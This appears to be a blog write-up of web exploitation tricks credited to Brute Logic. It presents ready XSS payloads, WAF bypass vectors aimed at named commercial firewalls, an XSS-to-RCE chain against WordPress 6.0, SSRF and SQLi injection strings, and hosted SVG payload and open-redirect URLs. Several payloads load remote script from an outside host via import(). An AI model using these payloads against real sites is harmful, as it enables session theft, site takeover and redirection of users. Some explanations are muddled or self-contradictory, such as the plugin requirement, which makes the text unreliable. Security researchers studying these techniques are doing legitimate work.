<h1>Brute Logic Tricks: Advanced Techniques in Web Security Exploitation</h1><br />
The following write-up highlights advanced web exploitation techniques focusing on XSS (Cross-Site Scripting) vulnerabilities, WAF (Web Application Firewall) bypasses, and SSRF (Server-Side Request Forgery) scenarios. These methods are tailored for skilled penetration testers and security researchers, offering a deeper understanding of how to trick filters and evade detection in web applications.
<br />
<h3>1. Escaping Filters Using Byte Bundles</h3>
<b>Concept:</b> To bypass filters that escape specific characters such as single quotes (') when performing web attacks, particularly XSS, one can leverage bytes in the range of %A1 to %FE. These byte ranges can be combined with a single quote to outsmart the filter mechanism.
<br />
<b>Explanation:</b> In web security, many systems sanitize or escape certain characters like %27 (which is the ASCII encoding for ') to prevent malicious injections. However, some filtering mechanisms do not account for all possible byte combinations. By using a byte from %A1 to %FE, you can evade certain character escape sequences and trick the filter into allowing the injection. This is particularly useful when performing brute-force logic attacks or exploring other injection techniques.
<br />
<h3>2. WP 6.0 XSS to RCE Proof of Concept (PoC)</h3>
<b>Concept:</b> In WordPress 6.0, a known exploit allows a user to escalate an XSS (Cross-Site Scripting) vulnerability to RCE (Remote Code Execution). The method involves creating a file (brute.txt) in the /wp-content/plugins folder.

<b>Example:</b>
import('//X55.is/wp')<br />
<b>Requirements:</b><br />

1. An admin user must be logged in with default write permissions.<br >
2. The "Hello Dolly" plugin needs to be activated (or left deactivated as it's a default plugin in WordPress).<br >
3. Explanation: XSS is a client-side code injection attack, but in this case, it can escalate into a server-side RCE if the admin user is logged in. The trick lies in leveraging the default permissions in WordPress installations to inject a malicious file. This kind of exploitation showcases the danger of poorly protected administrative interfaces in web applications.
<br >
<h3>3. Breaking Out of String Values with Quotes</h3><br >
<b>Concept:</b> To escape from any string value where user input is embedded, an injection of single or double quotes is essential unless there are two injection points.<br >

<b>Example:</b>
/alert(1)//\ <br >
<b>Explanation:</b> When user inputs are inserted into strings without proper sanitization, attackers can use single or double quotes to close the string and execute arbitrary code. However, if you have two injection points (such as opening and closing quotes around your payload), breaking out of a single point might not be necessary. The goal here is to manipulate the syntax of the code by closing strings prematurely, enabling the injection of additional malicious code.<br >

<h3>4. Anchors as XSS Vectors</h3>
<b>Concept:</b> HTML <a> tags (anchors) are powerful XSS vectors. By exploiting their attributes, one can trigger XSS payloads automatically.<br >

<b>Example 1:</b>
&lt;a href=//X55.is autofocus onfocus=import(href)&gt;<br >
<b>Explanation:</b> Here, the combination of the autofocus and onfocus attributes is used to trigger the import() function when the link is clicked or the element receives focus. This is an advanced method for exploiting XSS, taking advantage of HTML5 attributes. The anchor tag makes it especially dangerous since it is a common element on web pages and can be used to load external scripts without the need for parentheses.<br >

<h3>5. Misplacing Payloads and the "&lt" Symbol</h3>
<b>Concept:</b> If a payload and the "&lt" symbol are misplaced in HTML code, moving elements out of their usual place can still allow the execution of malicious code.<br >

<b>Example:</b>
&lt;Img Src="//X55.is/&gt; "OnError=import(src)//<br >
<b>Explanation:</b> In this example, the payload bypasses filters by misplacing the > symbol. This is a clever trick that can allow a malicious script to run even if the filter expects the payload to be in a specific position. The OnError event is used to trigger the payload when the image fails to load, effectively executing the malicious code.<br >

<h3>6. Securi WAF Bypass</h3>
<b>Concept:</b> Securi WAF (Web Application Firewall) can be bypassed using a crafted HTML form, as shown below.<br >

<b>Example:</b>

data:text/html,&lt;form action=https://brutelogic.com.br/xss-waf.php method=post&gt;&lt<br >
;input type=hidden name=a value="<K Contenteditable Autofocus OnFocusIn= [1].map(alert)>"&gt<br >
&lt;input type=submit value=XSS&gt;&lt/form&gt;<br >
<b>Explanation:</b> This example uses a hidden input field with a crafted payload to bypass the Securi WAF. The Contenteditable attribute allows for user interaction, while Autofocus and OnFocusIn trigger the attack when the form is submitted. Web Application Firewalls typically inspect requests for known patterns, but this creative form submission method can evade such detection mechanisms.
<br >
<h3>7. Impera WAF Bypass</h3>
<b>Concept:</b> By crafting a vector inside an SVG tag, it’s possible to bypass the Impera WAF.<br >
<b>Example:</b>
&lt;svg&gt;&lt;set onbegin=d=document,b='`',d['loca'+'tion']='javascript&colon;aler'+'t'+b+domain+b&gt;
<b></b>Explanation:</b> Here, the vector uses an SVG element with a set attribute that starts executing JavaScript code when the SVG is rendered. The code concatenates parts of the location object and JavaScript's alert() function to trigger an alert. This bypasses the Impera WAF, which likely doesn’t properly inspect or decode these complex constructs inside SVG files.

<h3>8. XSS Vulnerability from SSRF or SQLi Scenarios</h3>
<b>Concept:</b> Cross-Site Scripting (XSS) can emerge from SSRF (Server-Side Request Forgery) or SQL injection scenarios if improperly handled.<br >

<b>SSRF (curl-based) Example:</b>
?url=https://blablablabla-site.com/poc.svg
<b>SSRF (PHP file_get_contents) Example:</b>
?url=data:,<svg/onload=alert(1)>
<b>SQLi (error-based) Example:</b>
?id='<svg/onload=alert(1)><br >
<b>Explanation:</b> In these cases, XSS occurs because input parameters are not sanitized, allowing attackers to inject malicious scripts into server responses. SSRF exploits can be leveraged by providing URLs that return SVG files containing scripts, while SQLi can inject scripts directly into database queries, resulting in the execution of malicious code when the error message or query result is rendered.
<br >
<h3>9. Brute SVG Collection</h3>
Brute Logic offers a collection of SVG files, each serving different purposes in exploiting web vulnerabilities.<br >

XSS (no image)<br >

URL: https://brutelogic.com.br/poc.svg<br >
XSS (valid image)<br >

URL: https://brutelogic.com.br/brute.svg<br >
Redirect (default)<br >

URL: https://brutelogic.com.br/redir.svg<br >
Redirect (custom)<br >

URL: https://brutelogic.com.br/redir.svg?url=//X55.is<br >
Redirect (custom + warning)<br >

URL: https://brutelogic.com.br/redir.svg?url=//X55.is&w=1<br >
<b>Explanation:</b> This collection provides pre-built SVG files that trigger XSS or redirect behavior when accessed. The SVG format is commonly used for image rendering, but attackers can insert scripts into these files, making them a vector for XSS attacks. The redirect files can be customized to send users to any malicious site, with optional warning messages to obscure the true intent of the redirect.
<br >
<h3>Conclusion</h3>
The above techniques represent advanced strategies used by security researchers to test, bypass, and exploit web vulnerabilities. These methods emphasize the need for rigorous input validation, secure configuration, and proper use of web application firewalls to protect against common attack vectors like XSS, SSRF, and SQLi. As web security continues to evolve, so do the methods used by attackers, making it crucial to stay informed about these cutting-edge techniques.<br >

